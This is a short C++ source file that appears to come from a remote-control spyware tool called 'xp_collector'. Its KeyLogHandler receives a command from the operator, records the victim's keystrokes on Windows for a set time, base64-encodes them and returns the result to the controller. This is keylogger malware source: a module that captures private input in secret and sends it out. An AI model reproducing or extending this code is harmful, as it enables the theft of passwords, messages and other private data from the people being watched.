#include "KeyLogHandler.h"
#include <Commands/KeyLogCommand.h>
#include <Windows/WinUtils.h>
#include <Protocol/ReturnProductRequest.h>
#include <Products/KeyLogProduct.h>
#include <base64.hpp>
using namespace xp_collector;

KeyLogHandler::KeyLogHandler(std::string client_id)
	: ICommandHandler(std::move(client_id))
{
}

std::unique_ptr<IRequest> KeyLogHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	const auto key_log_command = std::static_pointer_cast<KeyLogCommand>(command);
	const std::string result = windows::log_keys(key_log_command->get_duration());
	const std::string encoded_result = base64::to_base64(result);
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<KeyLogProduct>(command->get_command_id(), command->get_command_type(), encoded_result)
	);
}
